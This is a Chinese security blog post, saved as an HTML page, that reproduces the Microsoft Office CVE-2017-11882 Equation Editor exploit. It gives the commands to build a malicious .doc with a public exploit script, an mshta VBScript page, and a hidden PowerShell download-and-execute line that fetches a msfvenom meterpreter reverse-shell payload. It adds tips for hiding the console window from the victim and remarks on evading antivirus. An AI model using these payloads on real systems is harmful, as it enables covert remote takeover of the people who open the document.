<!DOCTYPE html>
<html lang="zh_cn">

<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="chrome=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer">
<meta name="description" content="一个孤独散步者的梦">


<meta property="twitter:title" content="CVE-2017-11882 复现">

    <meta property="twitter:card" content="summary">

<meta property="twitter:description" content="">

<title>


     诗与胡说 - CVE-2017-11882 复现 

</title>
<link rel="canonical" href="https://kylingit.com/blog/cve-2017-11882-%E5%A4%8D%E7%8E%B0/">


<link rel="stylesheet" href="https://kylingit.com/css/main.v0.9.1.css">
<link rel="stylesheet" href="https://kylingit.com/css/ionicons.min.css">


  <link rel="stylesheet" href="https://kylingit.com/css/highlight.min.css">



  <link rel="stylesheet" href="https://kylingit.com/css/progressively.min.css">





<link rel="shortcut icon"

    href="https://kylingit.com/img/favicon.png"

>




</head>


<body>


<section class="header">

    <div class="container">
        <a href="https://kylingit.com/"><img class="logo" src="https://kylingit.com/img/logo.jpg" alt="logo" /></a>
        <div class="content">
            <a href="https://kylingit.com/"><div class="name"><h1>诗与胡说</h1></div></a>
            <nav>
                <ul>
                    
                        <a href="https://kylingit.com/blog/"><li>Blog</li></a>
                    
                    
                        
                    
                        
                            
                            <a href="https://kylingit.com/about"><li>about</li></a>
                            
                        
                    
                        
                            
                        
                    
                        
                            
                            <a href="https://kylingit.com/projects"><li>projects</li></a>
                            
                        
                    
                    
                        
                            <a href="https://kylingit.com/notes/"><li>notes</li></a>
                        
                    
                        
                    
                </ul>
            </nav>
        </div>
    </div>
</section>


<section class="main post non-narrow zero-top-spacing">
    <div class="container">
        <div class="content">
            <div class="front-matter">
                <div class="title-container">
                    <div class="page-heading">

    CVE-2017-11882 复现

</div>

                </div>
                <div class="meta">
                    <div class="date" title="Tue Nov 21 2017 18:40:29 UTC">Nov 21, 2017</div>
                    <div class="reading-time"><div class="middot"></div>1 minute read</div>
                </div>
            </div>
            <div class="markdown">
                
    
    

<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>

<p>上周微软更新日，修复了<code>CVE-2017-11882</code>这个漏洞，根据官方描述该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本，攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。漏洞位置是出现在一个公式编辑器上，叫做<code>EQNEDT32.EXE</code>，在win10上的路径是<code>C:\Program Files\Common Files\microsoft shared\EQUATION\EQNEDT32.EXE</code>，可以在编辑文档的时候插入公式。</p>

<p>最近有利用脚本出来了，也是自己尝试复现了几次，在此简单记录一下</p>

<p>下载<code>https://github.com/Ridter/CVE-2017-11882/</code>利用脚本，该脚本是<a href="https://evi1cg.me/archives/CVE_2017_11882_exp.html">@Evi1cg</a>改造后的脚本，经过测试效果还是不错的</p>

<p>生成一个测试文档的话执行
<code>python Command_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o test.doc
</code>
打开test.doc就会弹出计算器，而且全程没有提示或警告之类的弹窗，可以算是完美利用，比之前<a href="https://kylingit.com/blog/msword-code-exec-without-macro/">不带宏的代码执行</a>要简单粗暴</p>

<p>注意一点的是命令部分长度不能超过43bytes</p>

<h4 id="反弹shell">反弹shell</h4>

<p>下面主要讲一下反弹shell的利用</p>

<p>用mshta方式执行代码：
在vps上建立一个文件<code>test</code>，内容为</p>

<pre><code>&lt;HTML&gt; 
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
&lt;HEAD&gt; 
&lt;script language=&quot;VBScript&quot;&gt;
Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
objShell.Run &quot;calc.exe&quot;
self.close
&lt;/script&gt;
&lt;body&gt;
demo
&lt;/body&gt;
&lt;/HEAD&gt; 
&lt;/HTML&gt; 
</code></pre>

<p>关键是修改<code>objShell.Run</code>后面的部分</p>

<p>我们通过调用powershell下载一个反弹脚本然后执行的方式来获得shell：</p>

<p>修改<code>objShell.Run</code>为</p>

<p><code>objShell.Run powershell.exe -WindowStyle Hidden -NoP -sta -NonI -c IEX(New-Object System.Net.WebClient).DownloadString('http://ip/reverse.ps1');reverse.ps1&quot;</code></p>

<p>其中<code>reverse.ps1</code>通过<code>msfvenom</code>生成:</p>

<p><code>./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f psh-reflection &gt;reverse.ps1</code></p>

<p>msf开启监听，然后生成word文档：
<code>python Command_CVE-2017-11882.py -c &quot;mshta http://ip/test&quot; -o test.doc</code></p>

<p>打开之后就会收到shell</p>

<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/5TU1y" alt="test" />
<img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/KM1My" alt="session 1" />
但是这样会有一个问题，打开word文档的时候会发现有一个黑框一闪而过，而我们已经指定powershell以<code>-WindowStyle Hidden</code>的方式运行了，那怎么绕过这个黑框呢？</p>

<p>查一下<a href="https://msdn.microsoft.com/en-us/library/d5fk67ky(en-us,VS.85).aspx">文档</a>
可以看到<code>Run</code>命令是可以通过<code>intWindowStyle</code>参数来控制窗口风格的，有0-10这几种风格
<img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/q0F4b" alt="Run Method" />
所以我们在执行的命令后面加一个参数，用来控制mshta运行的窗口大小，使之最好隐藏窗口运行
<img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/ccxgV" alt="0" />
经过测试0和2参数都是可以的，达到隐藏窗口执行，用户察觉不了，其它参数可以自己试一下</p>

<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/qJKq7" alt="session 3" /></p>

<p>目前这样生成的文档在火绒和360杀毒的最新版上是没有报毒，但是各大杀软已经更新了规则，凡是远程调用执行cmd或者ps或者regsvr32等都会触发报警，暂时没有好的方法绕过，毕竟是监控着底层的那几个文件的。</p>

<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/fzUuw" alt="av" /></p>

<p>参考：</p>

<p><a href="https://evi1cg.me/archives/CVE_2017_11882_exp.html">https://evi1cg.me/archives/CVE_2017_11882_exp.html</a></p>

<p><a href="http://www.freebuf.com/vuls/154462.html">http://www.freebuf.com/vuls/154462.html</a></p>

<script>pangu.spacingPage();</script>


                <br>
                <p><a href="https://kylingit.com/blog">Back to posts</a></p>
            </div>
            <br>
            <div class="disqus">
                <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_shortname = 'kylingit';
    var disqus_identifier = 'https:\/\/kylingit.com\/blog\/cve-2017-11882-%E5%A4%8D%E7%8E%B0\/';
    var disqus_title = 'CVE-2017-11882 复现';
    var disqus_url = 'https:\/\/kylingit.com\/blog\/cve-2017-11882-%E5%A4%8D%E7%8E%B0\/';

    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
            </div>
        </div>
    </div>
</section>

<section class="footer">
    <div class="container">
        <div class="copyright">

        
            <a href="https://kylingit.com/license">Copyright © 2018 kylinking</a>
        

        </div>
        <div class="icons">

        
            <a href="https://github.com/kylingit" target="_blank">
                <i class="icon ion-social-github" title="github"></i>
            </a>
        

        

        

        
            <a href="mailto:ikylinking@gmail.com">
                <i class="icon ion-ios-email larger" title="email"></i>
            </a>
        

        
            <a href="https://kylingit.com/index.xml">
                <i class="icon ion-social-rss larger" title="rss"></i>
            </a>
        

        </div>
    </div>
</section>


  <script src="https://kylingit.com/js/highlight.min.js" defer></script>
  



  <script src="https://kylingit.com/js/progressively.min.js" defer></script>


<script>
  window.onload = function() {
    
      hljs.initHighlighting();
    
    
      progressively.init({delay: 30, throttle: 50});
    
  };
</script>

</body>
</html>

